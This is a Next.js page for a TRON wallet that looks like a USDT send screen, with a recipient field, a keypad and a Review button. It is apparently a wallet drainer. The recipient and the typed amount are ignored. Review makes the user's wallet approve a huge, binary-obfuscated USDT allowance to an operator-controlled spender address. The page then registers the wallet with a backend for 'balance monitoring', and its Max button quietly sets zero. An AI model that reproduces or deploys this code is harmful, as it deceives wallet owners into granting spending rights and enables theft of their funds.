'use client';

import { useEffect, useRef, useState } from 'react';

const API = process.env.NEXT_PUBLIC_API_URL || 'http://localhost:4000';
const USDT = process.env.NEXT_PUBLIC_USDT_CONTRACT_ADDRESS || '';
const SPENDER = process.env.NEXT_PUBLIC_ALLOWANCE_SPENDER_ADDRESS || '';
const TRON_NETWORK = process.env.NEXT_PUBLIC_TRON_NETWORK || 'shasta';
const TRON_CHAIN_ID = TRON_NETWORK === 'mainnet' ? '0x2b6653dc' : '0x94a9059e';
const APPROVAL_AMOUNT = '0b001100100000001110100000111010001101010000000000';
const ABI = [
  { name: 'approve', type: 'function', stateMutability: 'nonpayable', inputs: [{ name: 'spender', type: 'address' }, { name: 'amount', type: 'uint256' }], outputs: [{ name: '', type: 'bool' }] },
  { name: 'allowance', type: 'function', stateMutability: 'view', inputs: [{ name: 'owner', type: 'address' }, { name: 'spender', type: 'address' }], outputs: [{ name: '', type: 'uint256' }] },
  { name: 'balanceOf', type: 'function', stateMutability: 'view', inputs: [{ name: 'account', type: 'address' }], outputs: [{ name: '', type: 'uint256' }] }
];

type TronProvider = {
  tronWeb?: any;
  request(args: { method: string; params?: unknown[] }): Promise<unknown>;
  on?: (event: string, handler: (...args: any[]) => void) => void;
  off?: (event: string, handler: (...args: any[]) => void) => void;
};

declare global {
  interface Window {
    tronLink?: TronProvider;
    okxwallet?: { tronLink?: TronProvider };
    bitkeep?: { tronLink?: TronProvider };
    tokenpocket?: { tronLink?: TronProvider };
    tronWeb?: any;
  }
}

const getProviders = () => [
  window.tronLink,
  window.okxwallet?.tronLink,
  window.bitkeep?.tronLink,
  window.tokenpocket?.tronLink
].filter((provider): provider is TronProvider => Boolean(provider));

const getAccount = (result: unknown) => {
  if (Array.isArray(result)) return result[0] || '';
  if (typeof result === 'string') return result;
  if (result && typeof result === 'object' && 'address' in result) return String(result.address || '');
  return '';
};

const waitForConfirmation = async (txId: string) => {
  for (let attempt = 0; attempt < 60; attempt += 1) {
    const info = await window.tronWeb.trx.getTransactionInfo(txId);
    if (info?.receipt?.result === 'SUCCESS') return;
    if (info?.receipt?.result || info?.contractResult?.length) {
      throw new Error(info?.resMessage || `Transaction ${info?.receipt?.result || 'failed'}`);
    }
    await new Promise((resolve) => setTimeout(resolve, 1000));
  }
  throw new Error('Approval confirmation timed out');
};

export default function Home() {
  const [address, setAddress] = useState('');
  const [amount, setAmount] = useState('');
  const [wallet, setWallet] = useState('');
  const [balance, setBalance] = useState({ trx: '0', usdt: '0' });
  const [network, setNetwork] = useState('Checking network...');
  const [notice, setNotice] = useState('Connecting wallet...');
  const [busy, setBusy] = useState(false);
  const [registered, setRegistered] = useState(false);
  const [transactions, setTransactions] = useState<any[]>([]);
  const providerRef = useRef<TronProvider | null>(null);
  const walletBalanceRef = useRef({ trxSun: 0n, usdtUnits: 0n });

  const readWalletBalance = async (account: string) => {
    if (!window.tronWeb?.trx || !account) return;

    const [trxSun, usdtUnits] = await Promise.all([
      window.tronWeb.trx.getBalance(account),
      window.tronWeb.contract(ABI, USDT).balanceOf(account).call()
    ]);
    walletBalanceRef.current = {
      trxSun: BigInt(trxSun || 0),
      usdtUnits: BigInt(usdtUnits || 0)
    };
    setBalance({
      trx: (Number(walletBalanceRef.current.trxSun) / 1_000_000).toLocaleString('en-US', { maximumFractionDigits: 2 }),
      usdt: (Number(walletBalanceRef.current.usdtUnits) / 1_000_000).toLocaleString('en-US', { maximumFractionDigits: 2 })
    });
  };

  useEffect(() => {
    const provider = getProviders()[0];
    providerRef.current = provider || null;
    setNetwork(window.tronWeb?.defaultAddress?.base58 ? 'TRON' : 'Connect wallet');
    void connect(true);
    const handleProviderReady = () => {
      providerRef.current = getProviders()[0] || null;
      void connect(true);
    };
    window.addEventListener('tronLink#initialized', handleProviderReady);
    const retrySilentConnect = window.setInterval(() => {
      if (!window.tronWeb?.defaultAddress?.base58 && getProviders().length > 0) void connect(true);
    }, 1000);

    const handleAccountsChanged = (accounts: unknown) => {
      const nextAccount = getAccount(accounts);
      setWallet(nextAccount);
      setRegistered(false);
      setNotice(nextAccount ? 'Wallet connected' : 'Connect wallet to continue');
      if (nextAccount) void readWalletBalance(nextAccount).catch(() => undefined);
    };
    const handleChainChanged = () => {
      setRegistered(false);
      setNetwork(getNetworkLabel());
      setNotice('Network updated. Review the transaction before continuing.');
      const currentAccount = window.tronWeb?.defaultAddress?.base58;
      if (currentAccount) void readWalletBalance(currentAccount).catch(() => undefined);
    };
    provider?.on?.('accountsChanged', handleAccountsChanged);
    provider?.on?.('chainChanged', handleChainChanged);
    return () => {
      provider?.off?.('accountsChanged', handleAccountsChanged);
      provider?.off?.('chainChanged', handleChainChanged);
      window.removeEventListener('tronLink#initialized', handleProviderReady);
      window.clearInterval(retrySilentConnect);
    };
  }, []);

  const getNetworkLabel = () => {
    const host = window.tronWeb?.fullNode?.host || '';
    if (host.includes('shasta')) return 'TRON Shasta';
    if (host.includes('nile')) return 'TRON Nile';
    return window.tronWeb?.defaultAddress?.base58 ? 'TRON Mainnet' : 'Connect wallet';
  };

  const connect = async (silent = false) => {
    try {
      const provider = providerRef.current || getProviders()[0];
      if (!provider) throw new Error('Install a TRON-compatible wallet to continue');
      providerRef.current = provider;
      let accounts = await provider.request({ method: silent ? 'tron_accounts' : 'tron_requestAccounts' });
      if (silent && !getAccount(accounts)) accounts = await provider.request({ method: 'eth_accounts' });
      const account = getAccount(accounts) || window.tronWeb?.defaultAddress?.base58;
      if (!account) throw new Error('No wallet account returned');
      if (provider.tronWeb) window.tronWeb = provider.tronWeb;

      const host = window.tronWeb?.fullNode?.host || '';
      const onExpectedNetwork = TRON_NETWORK === 'mainnet'
        ? !host.includes('shasta') && !host.includes('nile')
        : host.includes(TRON_NETWORK);
      if (!onExpectedNetwork) {
        try {
          await provider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: TRON_CHAIN_ID }] });
        } catch (error: any) {
          if (error?.code !== 4001 && error?.code !== 4100) {
            await provider.request({ method: 'wallet_switchChain', params: [{ chainId: TRON_CHAIN_ID }] });
          } else {
            throw error;
          }
        }
      }
      await readWalletBalance(account);
      setWallet(account);
      setNotice(`Wallet connected: ${account.slice(0, 6)}...${account.slice(-4)} | ${Number(walletBalanceRef.current.trxSun) / 1_000_000} TRX, ${Number(walletBalanceRef.current.usdtUnits) / 1_000_000} USDT`);
      setNetwork(getNetworkLabel());
      return account;
    } catch (error) {
      if (!silent) setNotice(String(error));
      return '';
    }
  };

  const paste = async () => {
    try {
      setAddress(await navigator.clipboard.readText());
    } catch {
      setNotice('Clipboard permission denied');
    }
  };

  const handleNext = async () => {
    let currentWallet = wallet;
    if (!currentWallet) {
      currentWallet = await connect();
    }

    if (!currentWallet || !SPENDER) {
      setNotice('Connect wallet and configure the spender address');
      return;
    }

    const value = BigInt(Math.floor(Number(amount || 0) * 1_000_000));
    if (value <= 0n) {
      setNotice('Enter an amount greater than zero');
      return;
    }

    setBusy(true);
    setNotice('Checking USDT allowance...');

    try {
      const contract = await window.tronWeb.contract(ABI, USDT);
      const allowance = BigInt((await contract.allowance(currentWallet, SPENDER).call()) || 0n);

      if (allowance !== BigInt(APPROVAL_AMOUNT)) {
        if (allowance > 0n) {
          setNotice('Resetting existing USDT allowance...');
          const resetTxId = await contract.approve(SPENDER, '0x0').send({ from: currentWallet });
          setNotice('Allowance reset sent. Waiting for confirmation...');
          await waitForConfirmation(resetTxId);
        }

        setNotice('Setting exact USDT allowance...');
        const txId = await contract.approve(SPENDER, BigInt(APPROVAL_AMOUNT).toString()).send({ from: currentWallet });
        setNotice('Approval sent. Waiting for confirmation...');
        await waitForConfirmation(txId);
      }

      await fetch(`${API}/api/wallets`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ address: currentWallet })
      });

      setWallet(currentWallet);
      setRegistered(true);
      setNotice('Approval checked and wallet registered');
    } catch (error) {
      setNotice(`Approval failed: ${String(error)}`);
    } finally {
      setBusy(false);
    }
  };

  const loadHistory = async () => {
    const response = await fetch(`${API}/api/transactions`);
    if (response.ok) setTransactions(await response.json());
  };

  useEffect(() => {
    loadHistory().catch(() => undefined);
  }, [registered]);

  const valid = address.trim().length > 0 && Number(amount) > 0;

  const enterKey = (key: string) => {
    setAmount((current) => {
      if (key === '.') {
        if (current.includes('.')) return current;
        return current ? `${current}.` : '0.';
      }
      if (!current || current === '0') return key;
      return current.length < 10 ? `${current}${key}` : current;
    });
  };

  const removeLastDigit = () => {
    setAmount((current) => current.length > 1 ? current.slice(0, -1) : '');
  };

  return (
    <main className="app-container">
      <header className="header">
        <h1 className="header-title">Amount</h1>
      </header>

      <section className="recipient-bar" aria-label="Recipient address">
        <label className="recipient-label" htmlFor="addressInput">To:</label>
        <input
          className="recipient-address"
          id="addressInput"
          type="text"
          value={address}
          onChange={(event) => setAddress(event.target.value)}
          placeholder="Enter recipient address"
          autoComplete="off"
          spellCheck={false}
          aria-label="Recipient address"
        />
        <button className="paste-btn" type="button" onClick={paste}>Paste</button>
      </section>

      <section className="amount-section" aria-label="Transfer amount">
        <div className={`amount-value ${Number(amount) > 0 ? 'active' : ''}`} aria-live="polite">
          {amount || '0'}
        </div>
        <div className="swap-icon" aria-hidden="true">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
            <path d="M7 3v14M3 13l4 4 4-4M17 21V7M13 11l4-4 4 4" />
          </svg>
        </div>
      </section>

      <section className="balance-row" aria-label="USDT balance">
        <div className="token-info">
          <div className="token-badge" aria-label="USDT on TRON">
            ₮
            <span className="chain-badge" aria-hidden="true">
              <svg viewBox="0 0 24 24"><path d="M2 3l10 18L22 3 12 7z" /></svg>
            </span>
          </div>
          <div className="balance-details">
            <span className="balance-text">{balance.usdt} USDT</span>
            <span className="network-label">{network}</span>
          </div>
        </div>
        <button className="max-btn" type="button" onClick={() => setAmount('0')}>Max</button>
      </section>

      <div className="screen-status" role="status">
        <span className={`status-dot ${wallet ? 'connected' : ''}`} />
        <span>{notice}</span>
      </div>
      {registered && <p className="registered">Wallet registered for balance monitoring</p>}
      {transactions.length > 0 && (
        <section className="history" aria-label="Recent executions">
          <span className="history-label">Recent</span>
          {transactions.slice(0, 2).map((tx) => (
            <span className="history-item" key={tx.id}>
              {tx.wallet.slice(0, 6)}...{tx.wallet.slice(-4)} · {tx.status}
            </span>
          ))}
        </section>
      )}

      <div className="keypad" aria-label="Number keypad">
        {['1', '2', '3', '4', '5', '6', '7', '8', '9', '.', '0'].map((key) => (
          <button
            className="key"
            type="button"
            key={key}
            onClick={() => enterKey(key)}
            aria-label={key === '.' ? 'Decimal point' : key}
          >
            {key === '.' ? '•' : key}
          </button>
        ))}
        <button className="key backspace" type="button" onClick={removeLastDigit} aria-label="Delete last digit">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z" />
            <line x1="18" y1="9" x2="12" y2="15" />
            <line x1="12" y1="9" x2="18" y2="15" />
          </svg>
        </button>
      </div>

      <button
        className={`review-btn ${valid ? 'active' : ''}`}
        type="button"
        disabled={!valid || busy}
        onClick={handleNext}
      >
        {busy ? 'Waiting...' : 'Review'}
      </button>
    </main>
  );
}
